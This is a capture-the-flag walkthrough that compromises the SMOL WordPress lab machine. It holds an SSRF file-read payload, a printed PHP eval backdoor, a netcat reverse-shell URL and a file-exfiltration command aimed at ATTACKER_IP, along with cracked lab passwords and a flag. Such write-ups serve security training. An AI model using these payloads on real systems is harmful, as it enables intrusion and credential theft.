# SMOL CTF: A Complete Walkthrough from Initial Scan to Root

## I. Executive Summary & Attack Path Overview

### Introduction

This report provides a comprehensive walkthrough of the SMOL machine, a beginner-to-intermediate level Capture The Flag (CTF) challenge. The exercise demonstrates a realistic vulnerability chain, starting from initial web application enumeration and culminating in full system compromise. The target machine is located at the IP address 10.201.30.246 and is accessible via the hostname smol.thm.

### High-Level Attack Narrative

The compromise of the SMOL machine was achieved through a multi-stage attack that chained together several distinct vulnerabilities and misconfigurations. The path from initial access to root privileges can be summarized as follows:

* **Reconnaissance:** An initial network scan identified a WordPress website as the primary attack surface.
* **Initial Foothold:** A Server-Side Request Forgery (SSRF) vulnerability (CVE-2018-20463) in the jsmol2wp WordPress plugin was exploited to read the wp-config.php file, exposing database credentials.
* **Code Execution:** The leaked credentials were used to access the WordPress administrator dashboard. A pre-existing backdoor was discovered in the Hello Dolly plugin, which was then leveraged to achieve Remote Code Execution (RCE) as the www-data user.
* **User Pivot (diego):** With a shell as www-data, the database was queried to dump user password hashes. The hash for the user diego was successfully cracked, allowing a pivot to this user account.
* **User Pivot (think):** Enumeration of the filesystem as diego revealed an exposed SSH private key belonging to the user think, which was used to gain access to their account.
* **User Pivot (xavi):** Further enumeration as think uncovered a password-protected ZIP archive. The archive's password was cracked, and a backup configuration file within it contained credentials for the user xavi.
* **Root Escalation:** As xavi, an investigation of sudo permissions revealed an overly permissive rule, allowing for a direct and trivial escalation to the root user.

This CTF serves as a textbook illustration of how multiple, seemingly low-impact misconfigurations can be linked to achieve full system compromise. The initial SSRF did not grant a shell, the leaked credentials did not grant root, and no single step was a "magic bullet." Each successful step only provided the key to the next, underscoring the real-world importance of defense-in-depth. Fixing any single link in this chain—updating the plugin, removing the backdoor, correcting file permissions, or properly configuring sudo—would have thwarted the attack.

### Key Learning Objectives

This walkthrough details the practical application of several key penetration testing concepts, including web application enumeration, exploitation of SSRF and RCE vulnerabilities, deobfuscation of malicious code, multi-stage user pivoting, password cracking, and privilege escalation through misconfigured system permissions.

---

## II. Phase 1: Reconnaissance & Enumeration

### A. Network Discovery with Nmap

**Objective**
The goal was to discover all open TCP ports, identify the services running on those ports, and gather version and operating system information from the target machine.

**Execution**
A network scan was performed against the target smol.thm. For convenience, the target's IP address was first added to the local /etc/hosts file.

```bash
echo "10.201.30.246 smol.thm" | sudo tee -a /etc/hosts
```

While the exact Nmap command used is not explicitly stated in the source material, the detailed output is consistent with a comprehensive scan for services, versions, and scripts, such as:

```bash
nmap -sS -sV -A smol.thm
```

**Analysis of Results**
The scan results immediately narrowed the focus of the attack. With only two common ports open and running relatively modern software, the most logical path forward was to concentrate on the web application on port 80. An attempt to brute-force SSH at this stage would be highly inefficient. This demonstrates a core principle of penetration testing: analyzing initial data to form a strategic hypothesis and focus efforts where they are most likely to succeed.

The scan revealed the following:

* **Port 22/tcp (SSH):** The port was open and running OpenSSH 8.2p1 on an Ubuntu system. This is a modern version with no widely known remote vulnerabilities, making it an unlikely entry point without credentials.
* **Port 80/tcp (HTTP):** The port was open and running an Apache httpd 2.4.41 web server. The Nmap script output indicated that requests were being redirected to [http://www.smol.thm/](http://www.smol.thm/), confirming the necessity of the /etc/hosts entry and identifying this service as the primary attack surface.

**Summary Table**

| Port   | State | Service | Version                          | Service Info |
| ------ | :---: | :------ | :------------------------------- | :----------- |
| 22/tcp |  open | ssh     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 | Ubuntu Linux |
| 80/tcp |  open | http    | Apache httpd 2.4.41 ((Ubuntu))   | —            |

---

### B. WordPress Enumeration with WPScan

**Objective**
The objective was to identify the specific WordPress version, installed themes and plugins, and any publicly known vulnerabilities associated with them.

**Execution**
The wpscan tool was executed with the following command:

```bash
wpscan --url http://www.smol.thm
```

**Analysis of Key Findings**
The WPScan output provided several critical pieces of information that formed the basis for the initial exploit:

* **Outdated WordPress Core:** The site was running WordPress version 6.7.1, which was flagged as outdated.
* **Outdated Theme:** The active theme, twentytwentythree, was identified as version 1.2, also an outdated version.
* **Plugin jsmol2wp v1.07:** This was the most significant finding. A search for this specific plugin and version revealed a known Unauthenticated Server-Side Request Forgery (SSRF) vulnerability, cataloged as CVE-2018-20463.
* **Information Disclosure:** The scan confirmed that directory listing was enabled for the /wp-content/uploads/ directory and that the readme.html file was publicly accessible, both of which are minor information disclosure issues.

A crucial lesson from this scan is the need for independent verification. WPScan reported the jsmol2wp plugin as "up to date" because version 1.07 is the latest version ever released. However, "latest" does not mean "secure," as the plugin was last updated in 2018 and contains a known, unpatched vulnerability. An experienced attacker filters the noise (outdated core/theme, which may or may not have trivial exploits) and hones in on the signal: a specific, version-locked plugin with a publicly documented exploit path.

---

## III. Phase 2: Gaining Initial Foothold (www-data)

### A. Exploiting SSRF (CVE-2018-20463) for Information Disclosure

The SSRF vulnerability in the `jsmol2wp` plugin provided the entry point for accessing sensitive server-side files.

**Objective**
The goal was to leverage the SSRF vulnerability to read the `wp-config.php` file and extract database credentials.

**Vulnerability Breakdown**
Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing. In this specific PHP context, the vulnerability can be escalated. By using the `php://filter` wrapper, the SSRF is transformed into a Local File Inclusion (LFI) vulnerability, which allows for reading local files on the server filesystem instead of making external network requests.

**Payload Construction and Execution**
The following payload was crafted to target the vulnerable endpoint and read the `wp-config.php` file, which is located one directory above the plugin's PHP folder:

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=./../wp-config.php
```

**Analysis of Leaked Data**
The server responded to the malicious request with the full source code of the `wp-config.php` file. This file contained the database credentials for the WordPress application:

```
DB_NAME: 'wordpress'
DB_USER: 'wpuser'
DB_PASSWORD: 'kbLSF2Vop#lw3rjDZ629*Z%G'
```

---

### B. Uncovering and Deconstructing the Hello Dolly Backdoor

With administrative credentials in hand, the next step was to find a vector for executing code on the server.

**Objective**
The objective was to gain administrative access to the WordPress dashboard and identify a method for remote code execution.

**Administrative Access**
Using the credentials (`wpuser / kbLSF2Vop#lw3rjDZ629*Z%G`) obtained from the `wp-config.php` file, a successful login was performed at the WordPress admin panel:

```
http://www.smol.thm/wp-admin
```

**Discovering the Breadcrumb**
Inside the dashboard, a private post titled "Webmaster Tasks!!" contained an explicit instruction:

> "Check Backdoors: Verify the SOURCE CODE of 'Hello Dolly' plugin"

While this is a CTF-style hint, it reinforces the methodology of thoroughly enumerating all accessible content after gaining authenticated access. The previously identified SSRF vulnerability was then re-used to read the source code of the `hello.php` file.

**Deobfuscating the Payload**
Analysis of the `hello.php` source code revealed a suspicious, obfuscated line of code:

```php
eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXNOZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
```

The deobfuscation process involved two steps:

1. **Base64 Decoding**
   The Base64 string was decoded, revealing code with octal and hexadecimal escape sequences:

```bash
$ echo 'CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXNOZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=' | base64 -d
if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }
```

2. **Translate Escape Sequences to ASCII**
   The escape sequences were then translated to their ASCII equivalents:
   `\143` → `c`, `\155` → `m`, `\x64` → `d`.

**Final Deobfuscated Code**
The final, deobfuscated code revealed a simple but effective RCE backdoor that executes any command passed via the `cmd` GET parameter:

```php
if (isset($_GET["cmd"])) {
    system($_GET["cmd"]);
}
```

### C. Establishing an Interactive Shell

With an RCE vector confirmed, the final step for initial access was to establish a stable, interactive shell.

**Objective**
The objective was to convert the limited RCE capability into a persistent and interactive reverse shell connection.

**Execution**
First, a Netcat listener was started on the attacker machine to catch the incoming connection:

```bash
nc -lvnp 1337
```

Next, a URL was crafted to trigger the backdoor and execute a standard reverse shell one-liner. This command creates a named pipe (`/tmp/f`), redirects input and output, and pipes it into a Netcat connection back to the attacker's IP on port 1337:

```
http://www.smol.thm/wp-admin/index.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20ATTACKER_IP%201337%20%3E%2Ftmp%2Ff
```

**Shell Stabilization**
Upon successful execution, a connection was received on the listener from the target server, running as the `www-data` user. This initial shell is often basic and non-interactive. To upgrade it to a fully functional TTY with features like tab completion and job control, a standard Python PTY stabilization technique was used:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This sequence demonstrates a crucial escalation in control. The RCE backdoor provides a non-interactive "web shell," the Netcat one-liner provides a persistent TCP connection, and the Python PTY trick upgrades it to a fully functional terminal—essential for subsequent enumeration and privilege escalation.

---

## IV. Phase 3: Multi-Stage Privilege Escalation

Gaining root access required a series of pivots through multiple user accounts, each step uncovering the information needed for the next.

| From User | To User | Method Employed                               | Key Finding                              |
| --------- | ------- | --------------------------------------------- | ---------------------------------------- |
| www-data  | diego   | Database Credential Abuse & Password Cracking | Cracked phpass hash from wp\_users table |
| diego     | think   | Insecure File Permissions                     | Readable SSH private key in /home/think  |
| think     | xavi    | Insecure Backup & Archive Password Cracking   | Credentials in a wp-config.php backup    |
| xavi      | root    | Sudo Misconfiguration                         | Unrestricted sudo privileges             |

---

### A. Path to diego: Cracking WordPress Hashes

**Objective**
The goal was to leverage the previously discovered database credentials to extract and crack user password hashes.

**Database Enumeration and Hash Dumping**
Using the credentials from `wp-config.php`, a connection was made to the local MySQL server:

```bash
mysql -u wpuser -p'kbLSF2Vop#lw3rjDZ629*Z%G'
```

Once connected, the `wp_users` table within the `wordpress` database was queried:

```sql
USE wordpress;
SELECT user_login, user_pass FROM wp_users;
```

**Hash Identification and Cracking**
The dumped hashes began with the prefix `$P$`, characteristic of the phpass hashing algorithm used by older WordPress versions. The `hashid` tool confirmed this identification. The hashes were saved and cracked using `hashcat` mode 400 (phpass) against the `rockyou.txt` wordlist:

```bash
hashcat -m 400 hashes /usr/share/wordlists/rockyou.txt
```

The tool successfully cracked the hash for the user `diego`, revealing the password: `sandiegocalifornia`.

**Pivoting and Capturing the User Flag**

```bash
su diego
Password: sandiegocalifornia
cd ~
cat user.txt
# 45edaec653ff9ee06236b7ce72b86963
```

---

### B. Path to think: Leveraging an Exposed SSH Key

**Objective**
The objective was to enumerate the filesystem for sensitive files accessible by the `diego` user.

**Post-Exploitation Enumeration and Discovery**
Systematic enumeration of `/home` revealed that `/home/think/.ssh/` was readable. Inside, the private SSH key `id_rsa` was also readable by `diego`.

**Exploitation**
The key was copied to the attacker machine. Its permissions were restricted:

```bash
# On attacker machine, after pasting key into 'think_id_rsa'
chmod 600 think_id_rsa
```

The key was then used to authenticate as `think` via SSH:

```bash
ssh -i think_id_rsa think@smol.thm
```

---

### C. Path to xavi: Breaking Encrypted Archives

**Discovery**
While enumerating as `think`, a file named `wordpress.old.zip` was discovered in `/home/gege`. The name suggested it was a backup archive, often containing sensitive information.

**Cracking the Archive**
The archive was password-protected. Steps to crack it:

**Transfer the file:**

```bash
# On target machine
nc ATTACKER_IP 4444 < /home/gege/wordpress.old.zip

# On attacker machine
nc -lvnp 4444 > wordpress.old.zip
```

**Extract a crackable hash:**

```bash
zip2john wordpress.old.zip > zip_hash
```

**Crack the hash with a wordlist:**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash
```

The cracked password was: `hero_gege@hotmail.com`.

**Extracting New Credentials and Pivoting**
After unzipping, a `wp-config.php` file was found containing credentials for user `xavi`:

```
DB_USER: 'xavi'
DB_PASSWORD: 'Passwordxavia'
```

Pivot to `xavi`:

```bash
su xavi
Password: Passwordxavia
```

---

## V. Phase 4: Final Escalation to Root

### A. Exploiting Sudo Misconfiguration

**Objective**
Check `xavi`’s sudo rights and leverage any misconfigurations to gain root privileges.

**Checking Permissions and Analysis**

```bash
sudo -l
...
User xavi may run the following commands on ip-10-201-48-99:
    (ALL: ALL) ALL
```

This `(ALL: ALL) ALL` indicates full privileges, allowing execution as any user, including root.

**Exploitation**

```bash
sudo su
```

---

### B. Capturing the Root Flag

**Objective**
Read the final flag from `/root` to confirm complete system compromise.

**Execution**

```bash
cd /root
cat root.txt
```
